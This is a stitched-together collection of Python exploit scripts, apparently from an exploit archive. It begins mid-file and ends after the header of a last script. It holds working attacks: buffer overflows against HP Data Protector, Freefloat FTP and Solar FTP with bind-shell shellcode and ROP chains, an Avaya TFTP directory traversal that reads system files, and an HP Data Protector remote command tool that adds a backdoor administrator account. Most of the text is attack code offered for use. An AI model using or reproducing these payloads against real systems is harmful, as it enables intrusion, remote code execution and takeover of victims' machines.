#-----------------------------------------------------------------------------------
#
# At crash time our buffer is copied several times into memory (some of these are
# corrupt), so we write some fancy far-jump instruction in ESP. After this is
# decoded in memory we jump to our nop bytes (i think 3de itteration of our buffer).
# Ironically this doesn't even crash the program, only when you close the bind
# shell connection does the program crash...
#
# jmp esp - user32.dll => 0x7E429353
#-----------------------------------------------------------------------------------
buffer = "\x90"*41 + shellcode + "\x90"*23 + "\x53\x93\x42\x7E" + "\x90"*1 + farjump + "\x90"*175

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.71',21))
s.recv(1024)
s.send('USER ' + 'b33f\r\n')
print (s.recv(1024))
s.send('PASS b33f\r\n')
print (s.recv(1024))
s.send('RETR ' + buffer + '\r\n')
s.close
#!/usr/bin/python
# HP Data Protector 6.11 Remote Buffer Overflow
# Tested on Windows 2003 R2 + DEP Enabled
# Authors: muts & dookie
# Reference: http://www.exploit-db.com/exploits/17458/
# Reference: http://www.coresecurity.com/content/HP-Data-Protector-multiple-vulnerabilities
# http://www.offensive-security.com/0day/hp-dataprotector.py.txt

import struct, socket, sys
target = sys.argv[1]

# bindshell - port 4444
shellcode = ("\xbf\x83\x75\x7f\xdd\xdb\xc8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x56\x31\x7e\x13\x03\x7e\x13\x83\xee\x7f\x97\x8a\x21\x97\xd1"
"\x75\xda\x67\x82\xfc\x3f\x56\x90\x9b\x34\xca\x24\xef\x19\xe6"
"\xcf\xbd\x89\x7d\xbd\x69\xbd\x36\x08\x4c\xf0\xc7\xbc\x50\x5e"
"\x0b\xde\x2c\x9d\x5f\x00\x0c\x6e\x92\x41\x49\x93\x5c\x13\x02"
"\xdf\xce\x84\x27\x9d\xd2\xa5\xe7\xa9\x6a\xde\x82\x6e\x1e\x54"
"\x8c\xbe\x8e\xe3\xc6\x26\xa5\xac\xf6\x57\x6a\xaf\xcb\x1e\x07"
"\x04\xbf\xa0\xc1\x54\x40\x93\x2d\x3a\x7f\x1b\xa0\x42\x47\x9c"
"\x5a\x31\xb3\xde\xe7\x42\x00\x9c\x33\xc6\x95\x06\xb0\x70\x7e"
"\xb6\x15\xe6\xf5\xb4\xd2\x6c\x51\xd9\xe5\xa1\xe9\xe5\x6e\x44"
"\x3e\x6c\x34\x63\x9a\x34\xef\x0a\xbb\x90\x5e\x32\xdb\x7d\x3f"
"\x96\x97\x6c\x54\xa0\xf5\xf8\x99\x9f\x05\xf9\xb5\xa8\x76\xcb"
"\x1a\x03\x11\x67\xd3\x8d\xe6\x88\xce\x6a\x78\x77\xf0\x8a\x50"
"\xbc\xa4\xda\xca\x15\xc4\xb0\x0a\x99\x11\x16\x5b\x35\xc9\xd7"
"\x0b\xf5\xb9\xbf\x41\xfa\xe6\xa0\x69\xd0\x91\xe6\xa7\x00\xf2"
"\x80\xc5\xb6\xe5\x0c\x43\x50\x6f\xbd\x05\xca\x07\x7f\x72\xc3"
"\xb0\x80\x50\x7f\x69\x17\xec\x69\xad\x18\xed\xbf\x9e\xb5\x45"
"\x28\x54\xd6\x51\x49\x6b\xf3\xf1\x00\x54\x94\x88\x7c\x17\x04"
"\x8c\x54\xcf\xa5\x1f\x33\x0f\xa3\x03\xec\x58\xe4\xf2\xe5\x0c"
"\x18\xac\x5f\x32\xe1\x28\xa7\xf6\x3e\x89\x26\xf7\xb3\xb5\x0c"
"\xe7\x0d\x35\x09\x53\xc2\x60\xc7\x0d\xa4\xda\xa9\xe7\x7e\xb0"
"\x63\x6f\x06\xfa\xb3\xe9\x07\xd7\x45\x15\xb9\x8e\x13\x2a\x76"
"\x47\x94\x53\x6a\xf7\x5b\x8e\x2e\x07\x16\x92\x07\x80\xff\x47"
"\x1a\xcd\xff\xb2\x59\xe8\x83\x36\x22\x0f\x9b\x33\x27\x4b\x1b"
"\xa8\x55\xc4\xce\xce\xca\xe5\xda")

wpm = "\x55\x23\xe4\x77"        # 77E42355 WriteProcessMemory - Win2k3  
wpm += "\x50\xd0\x4b\x00"       # 004bd050 omniinet.exe - Return after WPM  
wpm += "\xff\xff\xff\xff"       # hProcess  
wpm += "\x50\xd0\x4b\x00"       # 004bd050 omniinet.exe - Address to Patch  
wpm += "\x41\x41\x41\x41"       # lpBuffer placeholder (Shellcode Address)  
wpm += "\x42\x42\x42\x42"       # nSize placeholder (Shellcode Size)  00001000
wpm += "\x38\xd4\x4b\x00"       # 004BD438 omniinet.exe - Pointer for Written Bytes  

# pre
packet = ("\x00\x00\x27\xCA\xFF\xFE\x32\x00\x00\x00\x20\x00\x61\x00\x00\x00"
"\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00"
"\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x32\x00\x30\x00\x00\x00"
"\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00"
"\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00"
"\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00")

# padding to EIP
packet +="A"* 2004
# Get a copy of ESP into a register for safekeeping
packet +="\x1f\x59\x37\x7c" # 0x7c37591f  PUSH ESP # ADD EAX,DWORD PTR DS:[EAX] # ADD CH,BL # INC EBP # OR AL,59 # POP ECX # POP EBP # RETN
packet += "\x44" * 4  # junk to pop into EBP

# Jump over the WPM parameters
packet += "\xfe\x9b\x35\x7c"  # 0x7c359bfe :  # ADD ESP,20 # RETN 
packet += wpm
packet += "\x44" * 4   # filler

# Get EAX to point at our shellcode on the stack and overwrite the placeholder
packet += "\x40\xa0\x35\x7c"  # 0x7c35a040 :  # MOV EAX,ECX # RETN  
packet += "\x1c\x3b\x37\x7c"  # 0x7c373b1c :  # ADD EAX,100 # POP EBP # RETN
packet += "\x44" * 4  # filler
packet += "\xd4\x3d\x43\x00"  # 0x00433dd4 :  # MOV DWORD PTR DS:[ECX+18],EAX # POP EBP # RETN    ** [omniinet.exe]
packet += "\x44" * 4  # filler

# Craft the shellcode size in EAX and overwrite the placeholder
packet += "\x2e\x40\x34\x7c"  # 0x7c34402e :  # POP EDX # RETN    ** [MSVCR71.dll]
packet += "\x59\x3d\x41\x41"  #  Value to SUB from EAX 
packet += "\x23\x62\x37\x7c"  # 0x7c376223 :  # POP EAX # RETN    ** [MSVCR71.dll]
packet += "\x41\x41\x41\x41"  # To be the sub-ee 41413D59
packet += "\xe9\xfa\x36\x7c"  # 0x7c36fae9 :  # SUB EAX,EDX # POP ESI # RETN    ** [MSVCR71.dll]
packet += "\x44" * 4  # filler
packet += "\x69\x60\x37\x7c"  # 0x7c376069 :  # MOV DWORD PTR DS:[ECX+1C],EAX # POP EDI # POP ESI # POP EBX # RETN    ** [MSVCR71.dll]
packet += "\x44" * 12  # filler

# Point ESP to WPM and the stack and return
packet += "\x40\xa0\x35\x7c"  # 0x7c35a040 :  # MOV EAX,ECX # RETN    ** [MSVCR71.dll]
packet += "\x66\x61\x43\x00"  # 0x00436166 :  # ADD EAX,2 # POP EBP # RETN    ** [omniinet.exe]
packet += "\x44" * 4  # filler
packet += "\x66\x61\x43\x00"  # 0x00436166 :  # ADD EAX,2 # POP EBP # RETN    ** [omniinet.exe]
packet += "\x44" * 4  # filler
packet += "\x66\x61\x43\x00"  # 0x00436166 :  # ADD EAX,2 # POP EBP # RETN    ** [omniinet.exe]
packet += "\x44" * 4  # filler
packet += "\x66\x61\x43\x00"  # 0x00436166 :  # ADD EAX,2 # POP EBP # RETN    ** [omniinet.exe]
packet += "\x44" * 4  # filler
packet += "\x05\x8b\x34\x7c"  # 0x7c348b05 :  # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]
packet += "\x45" * 8
packet +="\x90" *120
packet += shellcode
packet +="C"* 980000
# post
packet +=("\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00"
"\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00"
"\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00"
"\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00"
"\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00"
"\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00\x20\x00\x61\x00\x00\x00")

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect((target, 5555))
sock.send(packet)
sock.close()
#!/usr/bin/python

###############################################################################
#
#Title    : Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability
#Author   : Veerendra G.G from SecPod Technologies (www.secpod.com)
#Vendor   : http://www.avaya.com/usa/product/ip-office
#Advisory : http://www.avaya.com/usa/product/ip-office
#           http://secpod.org/SECPOD_Avaya-IP-Manager-TFTP-Dir-Trav.pcap
#           http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py
#           http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt
#Version  : Avaya IP Office Manager TFTP Server Version 8.1
#Date     : 08/07/2011
#
################################################################################
#
#SecPod ID: 1017					25/05/2011 Issue Discovered
#                                                31/05/2011 Vendor Notified
#                                                No Response from the Vendor
#                          		        08/07/2011 Advisory Released
#					       
#
#Class: Information Disclosure			Severity: Medium
#
#
#Overview:
#---------
#Avaya IP Office Manager TFTP Server Version 8.1 is prone to a Directory
#Traversal vulnerability.
#
#
#Technical Description:
#----------------------
#The vulnerability is caused due to improper validation to Read Request
#Parameter containing '../' sequences, which allows attackers to read
#arbitrary files via directory traversal attacks.
#
#
#Impact:
#--------
#Successful exploitation could allow an attacker to to obtain sensitive
#information, which can lead to launching further attacks.
#
#
#Affected Software:
#------------------
#Avaya IP Office Manager TFTP Server Version 8.1
#
#
#Tested on:
#-----------
#Avaya IP Office Manager TFTP Server Version 8.1 on Windows XP SP3.
#
#
#References:
#-----------
#http://secpod.org/blog/?p=225
#http://www.avaya.com/usa/product/ip-office
#http://secpod.org/SECPOD_Avaya-IP-Manager-TFTP-Dir-Trav.pcap
#http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py
#http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt
#
#
#Proof of Concept:
#----------------
#http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py
#http://secpod.org/SECPOD_Avaya-IP-Manager-TFTP-Dir-Trav.pcap
#
#
#Solution:
#----------
#Not available
#
#
#Risk Factor:
#-------------
#    CVSS Score Report: 
#        ACCESS_VECTOR          = NETWORK 
#        ACCESS_COMPLEXITY      = LOW 
#        AUTHENTICATION         = NOT_REQUIRED 
#        CONFIDENTIALITY_IMPACT = PARTIAL 
#        INTEGRITY_IMPACT       = NONE 
#        AVAILABILITY_IMPACT    = NONE 
#        EXPLOITABILITY         = PROOF_OF_CONCEPT 
#        REMEDIATION_LEVEL      = UNAVAILABLE 
#        REPORT_CONFIDENCE      = CONFIRMED 
#        CVSS Base Score        = 5.0 (AV:N/AC:L/Au:NR/C:P/I:N/A:N) 
#        CVSS Temporal Score    = 4.5 
#        Risk factor            = Medium 
#
#
#Credits:
#--------
#Veerendra G.G of SecPod Technologies has been credited with the discovery of
#this vulnerability.
#
#
#SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py:
#

##############################################################################
# Exploit   : http://secpod.com/blog/?p=225
#             http://secpod.org/Exploit-Avaya-IP-Manager-Dir-Trav.py
#             http://secpod.org/advisories/SecPod_Avaya_IP_Manager_TFTP_Dir_Trav.txt
# Author    : Veerendra G.G from SecPod Technologies (www.secpod.com)
#
# Get File content using Directory Traversal Attack
# Tested against Avaya Office IP Manager 8.1
##############################################################################

def sendPacket(HOST, PORT, data):
    '''
    Sends UDP Data to a Particular Host on a Specified Port
    with a Given Data and Return the Response
    '''
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.sendto(data, (HOST, PORT))
    data = udp_sock.recv(1024)
    udp_sock.close()
    return data

if __name__ == "__main__":

    if len(sys.argv) < 2:
        print "\tUsage: python exploit.py target_ip"
        print "\tExample : python exploit.py 127.0.0.1"
        print "\tExiting..."
        sys.exit(0)

    HOST = sys.argv[1]       			## The Server IP
    PORT = 69                			## Default TFTP port

    data = "\x00\x01"        			## TFTP Read Request
    data += "../" * 10 + "boot.ini" + "\x00"	## Read boot.ini file using directory traversal
    data += "octet\x00"				## TFTP Type

    rec_data = sendPacket(HOST, PORT, data)
    print "Data Found on the target : %s " %(HOST)
    print rec_data.strip()#!/usr/bin/python
from struct import pack
import socket,sys
import os

print " ||=============================================================||"
print " ||                                                             ||"
print " ||      /      \    0-Exploit (Zer0 Thunder)                   ||"
print " ||   \  \  ,,  /  /--------------------------------------------||"
print " ||    '-.`\()/`.-'          ===========================        ||"
print " ||   .--_'(  )'_--.Freefloat FTP [LIST] Buffer Overflow Exploit||"
print " ||  / /` /`**`\ `\ \        ----pwn the shell----              ||"
print " ||   |  |  ><  |  |                                            ||"
print " ||   \  \      /  /                                            ||"
print " ||       '.__.'                                                ||"
print " ||                                                             ||"
print " ||=============================================================||"
 
if len(sys.argv) != 3:
    print "Usage: ./freeftp.py [IP] [PORT]"
    sys.exit(1)
  
target = sys.argv[1]
port = int(sys.argv[2])
 
junk = "\x41" * 246
add = pack('<L',0x77c35459)
nops = "\x90" * 20
shell= ("\x33\xc9\x83\xe9\xaa\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\xbb\xc1\x9c\x35\x83\xee\xfc\xe2\xf4\x47\x29\x15\x35\xbb\xc1"
"\xfc\xbc\x5e\xf0\x4e\x51\x30\x93\xac\xbe\xe9\xcd\x17\x67\xaf"
"\x4a\xee\x1d\xb4\x76\xd6\x13\x8a\x3e\xad\xf5\x17\xfd\xfd\x49"
"\xb9\xed\xbc\xf4\x74\xcc\x9d\xf2\x59\x31\xce\x62\x30\x93\x8c"
"\xbe\xf9\xfd\x9d\xe5\x30\x81\xe4\xb0\x7b\xb5\xd6\x34\x6b\x91"
"\x17\x7d\xa3\x4a\xc4\x15\xba\x12\x7f\x09\xf2\x4a\xa8\xbe\xba"
"\x17\xad\xca\x8a\x01\x30\xf4\x74\xcc\x9d\xf2\x83\x21\xe9\xc1"
"\xb8\xbc\x64\x0e\xc6\xe5\xe9\xd7\xe3\x4a\xc4\x11\xba\x12\xfa"
"\xbe\xb7\x8a\x17\x6d\xa7\xc0\x4f\xbe\xbf\x4a\x9d\xe5\x32\x85"
"\xb8\x11\xe0\x9a\xfd\x6c\xe1\x90\x63\xd5\xe3\x9e\xc6\xbe\xa9"
"\x2a\x1a\x68\xd3\xf2\xae\x35\xbb\xa9\xeb\x46\x89\x9e\xc8\x5d"
"\xf7\xb6\xba\x32\x44\x14\x24\xa5\xba\xc1\x9c\x1c\x7f\x95\xcc"
"\x5d\x92\x41\xf7\x35\x44\x14\xcc\x65\xeb\x91\xdc\x65\xfb\x91"
"\xf4\xdf\xb4\x1e\x7c\xca\x6e\x48\x5b\x04\x60\x92\xf4\x37\xbb"
"\xd0\xc0\xbc\x5d\xab\x8c\x63\xec\xa9\x5e\xee\x8c\xa6\x63\xe0"
"\xe8\x96\xf4\x82\x52\xf9\x63\xca\x6e\x92\xcf\x62\xd3\xb5\x70"
"\x0e\x5a\x3e\x49\x62\x32\x06\xf4\x40\xd5\x8c\xfd\xca\x6e\xa9"
"\xff\x58\xdf\xc1\x15\xd6\xec\x96\xcb\x04\x4d\xab\x8e\x6c\xed"
"\x23\x61\x53\x7c\x85\xb8\x09\xba\xc0\x11\x71\x9f\xd1\x5a\x35"
"\xff\x95\xcc\x63\xed\x97\xda\x63\xf5\x97\xca\x66\xed\xa9\xe5"
"\xf9\x84\x47\x63\xe0\x32\x21\xd2\x63\xfd\x3e\xac\x5d\xb3\x46"
"\x81\x55\x44\x14\x27\xc5\x0e\x63\xca\x5d\x1d\x54\x21\xa8\x44"
"\x14\xa0\x33\xc7\xcb\x1c\xce\x5b\xb4\x99\x8e\xfc\xd2\xee\x5a"
"\xd1\xc1\xcf\xca\x6e\xc1\x9c\x35")
payload = junk+add+nops+shell
 
print "[+] Connecting to Target " + target + "..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
try:
    connect=s.connect((target, port))
    print "[+] Target FTP Connected!"
except:
    print "[!] FTP didn't respond\n"
    sys.exit(0)
 
s.recv(1024)
 

s.send('USER anonymous\r\n')
s.recv(1024)
s.send('PASS anonymous\r\n')
s.recv(1024)
print "[+] Sending payload..."
s.send('LIST ' + payload + '\r\n')
s.recv(1024)
 
print "[!] Exploit has been sent!. Please try telnet [target ip] 4444\n"
 
try:
    s.recv(1024)
    print "[!] Exploit failed !."
 
except:
    print "[+] Pwned the shell !"
 
s.close()#!/usr/bin/python

#Title:	Solar FTP 2.1.1 PASV Command PoC
#Authors: Craig Freyman (@cd1zz) and Gerardo Iglesias (@iglesiasgg)
#Tested: Windows XP SP3
#Vendor Contacted July 11, 2011
#Vendor Response: July 12, 2011 - Will fix ASAP, approved release of PoC.
#Notes: We found different offsets depending on the subnet that the server was running on. 
#This particular exploit was run with the server running on 192.168.133.128. If you test this exploit and the
#app just crashes instead of running the shellcode, pass the exeptions through your debugger and after 
#about 5 of them, you'll see EIP overwritten. If you can figure out why these offsets change, more power to you!
#We found the most consistent behavior using a total buffer of about 2127 bytes.

import socket,sys,time,struct

if len(sys.argv) < 2:
     print "[-]Usage: %s <target addr> " % sys.argv[0]
     
     sys.exit(0)

target = sys.argv[1]

if len(sys.argv) > 2:
     platform = sys.argv[2]

#./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b '\x00'
#[*] x86/shikata_ga_nai succeeded with size 368 (iteration=1)

shellcode = ("\xd9\xcf\xbe\x41\xb0\x13\xe9\xd9\x74\x24\xf4\x5f\x29\xc9" 
"\xb1\x56\x31\x77\x18\x03\x77\x18\x83\xc7\x45\x52\xe6\x15" 
"\xad\x1b\x09\xe6\x2d\x7c\x83\x03\x1c\xae\xf7\x40\x0c\x7e" 
"\x73\x04\xbc\xf5\xd1\xbd\x37\x7b\xfe\xb2\xf0\x36\xd8\xfd" 
"\x01\xf7\xe4\x52\xc1\x99\x98\xa8\x15\x7a\xa0\x62\x68\x7b" 
"\xe5\x9f\x82\x29\xbe\xd4\x30\xde\xcb\xa9\x88\xdf\x1b\xa6" 
"\xb0\xa7\x1e\x79\x44\x12\x20\xaa\xf4\x29\x6a\x52\x7f\x75" 
"\x4b\x63\xac\x65\xb7\x2a\xd9\x5e\x43\xad\x0b\xaf\xac\x9f" 
"\x73\x7c\x93\x2f\x7e\x7c\xd3\x88\x60\x0b\x2f\xeb\x1d\x0c" 
"\xf4\x91\xf9\x99\xe9\x32\x8a\x3a\xca\xc3\x5f\xdc\x99\xc8" 
"\x14\xaa\xc6\xcc\xab\x7f\x7d\xe8\x20\x7e\x52\x78\x72\xa5" 
"\x76\x20\x21\xc4\x2f\x8c\x84\xf9\x30\x68\x79\x5c\x3a\x9b" 
"\x6e\xe6\x61\xf4\x43\xd5\x99\x04\xcb\x6e\xe9\x36\x54\xc5" 
"\x65\x7b\x1d\xc3\x72\x7c\x34\xb3\xed\x83\xb6\xc4\x24\x40" 
"\xe2\x94\x5e\x61\x8a\x7e\x9f\x8e\x5f\xd0\xcf\x20\x0f\x91" 
"\xbf\x80\xff\x79\xaa\x0e\x20\x99\xd5\xc4\x57\x9d\x1b\x3c" 
"\x34\x4a\x5e\xc2\xab\xd6\xd7\x24\xa1\xf6\xb1\xff\x5d\x35" 
"\xe6\x37\xfa\x46\xcc\x6b\x53\xd1\x58\x62\x63\xde\x58\xa0" 
"\xc0\x73\xf0\x23\x92\x9f\xc5\x52\xa5\xb5\x6d\x1c\x9e\x5e" 
"\xe7\x70\x6d\xfe\xf8\x58\x05\x63\x6a\x07\xd5\xea\x97\x90" 
"\x82\xbb\x66\xe9\x46\x56\xd0\x43\x74\xab\x84\xac\x3c\x70" 
"\x75\x32\xbd\xf5\xc1\x10\xad\xc3\xca\x1c\x99\x9b\x9c\xca" 
"\x77\x5a\x77\xbd\x21\x34\x24\x17\xa5\xc1\x06\xa8\xb3\xcd" 
"\x42\x5e\x5b\x7f\x3b\x27\x64\xb0\xab\xaf\x1d\xac\x4b\x4f" 
"\xf4\x74\x7b\x1a\x54\xdc\x14\xc3\x0d\x5c\x79\xf4\xf8\xa3" 
"\x84\x77\x08\x5c\x73\x67\x79\x59\x3f\x2f\x92\x13\x50\xda" 
"\x94\x80\x51\xcf")

#7C9572D8 JMP EAX

ret = struct.pack('<L', 0x7C9572D8)

#works when the server is on 192.168.133.128
padding = "\x43" * 100
junk = "\x43" * (1900 - len(shellcode))
frontpad = "\x41" * 100 + "\xeb\x30" + "\x41" * 21
crash = frontpad + ret + padding + shellcode + junk

print "\
[*] Solar FTP 2.1.1 PASV Exploit\n\
[*] Authors: Craig Freyman (@cd1zz) and Gerardo Iglesias (@iglesiasgg)\n\
[*] Connecting to "+target

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    s.connect((target,21))
except:
    print "[-] Connection to "+target+" failed!"
    sys.exit(0)

print "[*] Sending " + `len(crash)` + " byte PASV crash..."

s.send("USER test\r\n")
s.recv(1024)
s.send("PASS test\r\n")
s.recv(1024)
s.send("PASV " + crash + "\r\n")


#!/usr/bin/python
 
# Exploit Title: HP-Data-Protector-8.10 Remote command execution.
# Date: July 11 2014
# Exploit Author: Christian (Polunchis) Ramirez https://intrusionlabs.org
# Exploit Author: Henoch (Chanoc) Barrera       https://intrusionlabs.org
# Contacts: polunchis@intrusionlabs.org and chanoc@intrusionlabs.org
# Version: HP Data Protector manager 8.10 the last version
# Vendor web page: http://www8.hp.com/mx/es/software-solutions/software.html?compURI=1175640#.U8DhWaU_BjF
# Tested on: Windows 2003, Windows 2008 and Windows 2012 all languages 
# Thanks:To GOD for giving us wisdom      
# Description: 
# A remote command execution is triggered when craft command is sent to the Hp Data Protector Manager to tcp port 5555.

import socket
import struct
import sys

#net user Poc l@bs.og /add
shellusr = ("\x00\x00\x01\x3c\xff\xfe\x32\x00\x00\x00\x20\x00\x68\x00\x70\x00"
"\x64\x00\x70\x00\x31\x00\x00\x00\x20\x00\x30\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x00\x00\x20\x00\x45\x00\x4e\x00\x55\x00\x00\x00"
"\x20\x00\x31\x00\x31\x00\x00\x00\x20\x00\x45\x00\x58\x00\x45\x00"
"\x43\x00\x5f\x00\x42\x00\x41\x00\x52\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x63\x00\x3a\x00\x5c\x00\x77\x00\x69\x00"
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x73\x00\x79\x00"
"\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x63\x00"
"\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x2f\x00\x63\x00\x20\x00\x6e\x00\x65\x00\x74\x00"
"\x20\x00\x75\x00\x73\x00\x65\x00\x72\x00\x20\x00\x50\x00\x6f\x00"
"\x63\x00\x20\x00\x6c\x00\x40\x00\x62\x00\x73\x00\x2e\x00\x6f\x00"
"\x67\x00\x20\x00\x2f\x00\x61\x00\x64\x00\x64\x00\x00\x00\x00\x00")

#net user local group Administrators Poc /add
shellgrp = ("\x00\x00\x01\x56\xff\xfe\x32\x00\x00\x00\x20\x00\x68\x00\x70\x00"
"\x64\x00\x70\x00\x31\x00\x00\x00\x20\x00\x30\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x00\x00\x20\x00\x45\x00\x4e\x00\x55\x00\x00\x00"
"\x20\x00\x31\x00\x31\x00\x00\x00\x20\x00\x45\x00\x58\x00\x45\x00"
"\x43\x00\x5f\x00\x42\x00\x41\x00\x52\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00"
"\x20\x00\x41\x00\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00"
"\x41\x00\x41\x00\x41\x00\x00\x00\x20\x00\x41\x00\x41\x00\x41\x00"
"\x41\x00\x00\x00\x20\x00\x63\x00\x3a\x00\x5c\x00\x77\x00\x69\x00"
"\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x5c\x00\x73\x00\x79\x00"
"\x73\x00\x74\x00\x65\x00\x6d\x00\x33\x00\x32\x00\x5c\x00\x63\x00"
"\x6d\x00\x64\x00\x2e\x00\x65\x00\x78\x00\x65\x00\x00\x00\x20\x00"
"\x00\x00\x20\x00\x2f\x00\x63\x00\x20\x00\x6e\x00\x65\x00\x74\x00"
"\x20\x00\x6c\x00\x6f\x00\x63\x00\x61\x00\x6c\x00\x67\x00\x72\x00"
"\x6f\x00\x75\x00\x70\x00\x20\x00\x41\x00\x64\x00\x6d\x00\x69\x00"
"\x6e\x00\x69\x00\x73\x00\x74\x00\x72\x00\x61\x00\x74\x00\x6f\x00"
"\x72\x00\x73\x00\x20\x00\x50\x00\x6f\x00\x63\x00\x20\x00\x2f\x00"
"\x61\x00\x64\x00\x64\x00\x00\x00\x00\x00")

def connect_target(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as err:
        print
        "[-]Close Socket! CODE: %d MSG: %s" % (err[0], err[1])
        return -1

    try:
        sock.connect((target, port))
    except socket.error as err:
        print
        "[-] It cannot connect to the target! CODE: %d MSG: %s" % (err[0], err[1])
        return -1
    return sock

def send_recv_packet(sock, packet):
    sock.sendall(packet)
    res = sock.recv(4096)
    return res
print """
[*] https://intrusionlabs.org 
"""
print "[*] Choose a valid option"
print """
[1] Run remote commands 
[2] Add Poc user to Administrators group with password l@bs.og
"""
opcion= raw_input("Choose an option i.e.  1 or 2:  ")
if opcion.isdigit():
      opcion = int(opcion)

if opcion == 1:
 ip_remota= raw_input("IP Address: ")
 port= raw_input("Port: ")
 command= raw_input("command: ")
 if port.isdigit():
   port = int(port)
 else:
     print "Please provide a tcp port"

 objetivo = connect_target(ip_remota, port)
 if objetivo == -1: exit()
    
 OFFSET = 46
 command = command.replace("\\", "\\\\")
 command_tmno = chr(OFFSET + len(command))
 shell = "\x00\x00\x00"   +\
     command_tmno         +\
     "\x32\x00\x01"       +\
     "\x01\x01\x01"       +\
     "\x01\x01\x00"       +\
     "\x01\x00\x01"       +\
     "\x00\x01\x00"       +\
     "\x01\x01\x00"       +\
     "\x2028\x00"         +\
     "\\\x70\x65\x72"     +\
     "\x6c\x2e\x65\x78"   +\
     "\x65\x00 \x2d\x65"  +\
     "\x73\x79\x73\x74\x65\x6d" +\
     "('%s')\x00" % command
 print >> sys.stderr, "[+] Sending the payload with the command: '%s'" % command
 datos = send_recv_packet(objetivo, shell)  # Parse the response back
 print >> sys.stderr, "[+] Output:"
 while True:
        # Get information about response
        tmno_respuesta = objetivo.recv(4)
        if not tmno_respuesta: break
        n = struct.unpack(">I", tmno_respuesta)[0]
        respuesta = objetivo.recv(n)
        respuesta = respuesta[5:].strip()
        respuesta = respuesta.replace("\n", "")
        respuesta = respuesta.replace("\x00", "")
        if respuesta.upper().find("*RETVAL*") != -1:
            break
        print respuesta
   
 objetivo.close()
 print >> sys.stderr, "print [!] Port close...\r"

elif opcion == 2:
 ip_remota= raw_input("IP Address: ")
 port= raw_input("\nPort: ")
 if port.isdigit():
   port = int(port)
 else:
     print "Please provide a tcp port"

 print
 "\n [*]Creating P0c user and try to add it to Administrators group"

 #Get information about response
 print "\n[*]Attempting to create Poc user and try to add it to Administrators group with password l@bs.og"
 for packet in [shellusr, shellgrp]:
     target = connect_target(ip_remota, port)
     if target == -1: exit()
     data = send_recv_packet(target, packet)
     print "[*]SERVER RESPONSE: " + \
     data.split("\xFF\xFE\x31\x00\x35\x00\x00\x00\x20\x00")[1].lstrip("\x07\x00\x01\x00").rstrip("$")
     target.close()

else: print "Please provide a valid option i.e. 1 or 2"


#!/usr/bin/env python
#
#
# Oxwall 1.7.0 Remote Code Execution Exploit
#
#
# Vendor: Oxwall Software Foundation
# Product web page: http://www.oxwall.org
# Affected version: 1.7.0 (build 7907 and 7906)
#
# Summary: Oxwall is unbelievably flexible and easy to use PHP/MySQL
# social networking software platform.
#
